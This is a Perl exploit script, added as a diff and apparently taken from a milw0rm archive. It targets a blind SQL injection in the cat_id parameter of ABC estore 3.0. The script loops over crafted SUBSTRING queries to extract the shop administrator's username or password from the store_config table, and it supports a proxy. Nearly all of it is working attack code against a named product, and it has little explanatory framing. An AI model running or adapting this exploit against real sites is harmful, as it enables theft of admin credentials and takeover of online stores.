@@ -1,0 +1,105 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use Getopt::Long;
+
+if(!$ARGV[1])
+{
+ print "\n  |-------------------------------------------------|";
+ print "\n  |               newhack[dot]org                   |";
+ print "\n  |-------------------------------------------------|";
+ print "\n  |   ABC estore 3.0 (cat_id) Blind SQL Injection   |";
+ print "\n  |     Found by k1tk4t [k1tk4t(at)newhack.org]     |";
+ print "\n  |   DNX Code [dnx(at)hackermail.com] | Modified   |";
+ print "\n  |-------------------------------------------------|";
+ print "\n[!] Vendor: http://www.webtoolup.com/";
+ print "\n[!] Bug: in the index.php script, u can inject sql code in the (cat_id) parameter";
+ print "\n[!] Need Subcategories Product for success exploit";
+ print "\n[!] Usage: perl abcestore.pl [Host] [Path] <Options>";
+ print "\n[!] Example: perl abcestore.pl 127.0.0.1 /shop/ -c 10 -o 1 -t store_config";
+ print "\n[!] Options:";
+ print "\n       -c [no]       Valid cat_id products with subcategories, default is 1";
+ print "\n       -o [no]       1 = get username (default)";
+ print "\n                     2 = get password";
+ print "\n       -t [name]     Changes the admin table name, default is store_config";
+ print "\n       -p [ip:port]  Proxy support";
+ print "\n";
+ exit;
+}
+
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $cat     = 1;
+my $column  = "user";
+my $table   = "store_config";
+my %options = ();
+GetOptions(\%options, "c=i", "o=i", "t=s", "p=s");
+
+print "[!] Exploiting...\n";
+
+if($options{"c"}) { $cat = $options{"c"}; }
+if($options{"o"} && $options{"o"} == 2) { $column = "pass"; }
+if($options{"t"}) { $table = $options{"t"}; }
+
+syswrite(STDOUT, "[!] Data : ", 12);
+
+for(my $i = 1; $i <= 32; $i++)
+{
+ my $found = 0;
+ my $h = 48;
+ while(!$found && $h <= 57)
+ {
+   if(istrue2($host, $path, $table, $i, $h))
+   {
+     $found = 1;
+     syswrite(STDOUT, chr($h), 1);
+   }
+   $h++;
+ }
+ if(!$found)
+ {
+   $h = 97;
+   while(!$found && $h <= 122)
+   {
+     if(istrue2($host, $path, $table, $i, $h))
+     {
+       $found = 1;
+       syswrite(STDOUT, chr($h), 1);
+     }
+     $h++;
+   }
+ }
+}
+
+print "\n[!] Exploit done\n";
+
+sub istrue2
+{
+ my $host  = shift;
+ my $path  = shift;
+ my $table = shift;
+ my $i     = shift;
+ my $h     = shift;
+
+ my $ua = LWP::UserAgent->new;
+ my $url = "http://".$host.$path."index.php?cat_id=".$cat."%20AND%20SUBSTRING((SELECT%20".$column."%20FROM%20".$table."%20LIMIT%200,1),".$i.",1)=CHAR(".$h.")";
+
+ if($options{"p"})
+ {
+   $ua->proxy('http', "http://".$options{"p"});
+ }
+
+ my $response = $ua->get($url);
+ my $content = $response->content;
+ my $regexp = "Subcategories";
+
+ if($content =~ /$regexp/)
+ {
+   return 1;
+ }
+ else
+ {
+   return 0;
+ }
+}
+
+# milw0rm.com [2007-08-29]
